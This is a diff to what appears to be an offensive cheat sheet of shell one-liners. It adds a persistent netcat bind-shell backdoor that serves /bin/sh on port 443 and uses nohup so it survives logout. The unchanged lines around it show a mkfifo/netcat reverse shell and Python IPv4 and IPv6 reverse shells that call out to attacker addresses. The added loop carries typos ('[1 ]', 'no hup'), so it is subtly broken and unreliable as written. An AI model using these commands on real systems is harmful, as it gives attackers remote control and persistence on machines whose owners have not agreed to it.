@@ -47,12 +47,17 @@ nc openbsd (no -e):
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f    
     
+Persistent netcat backdoor using a while loop or nohup:  
+
+    while [1 ]; do echo "Started"; nc -l -p 443 -e /bin/sh; done     #goes away if user logs out, make persistent using nohup     
+    no hup ./listener.sh &    #listener.sh: above line. Make a process keep running, ignores logout signal 
+    
 ### other languages  
-python: 
+Python: 
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' 
     
-python ipv6:
+Python ipv6:
 
     python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
     
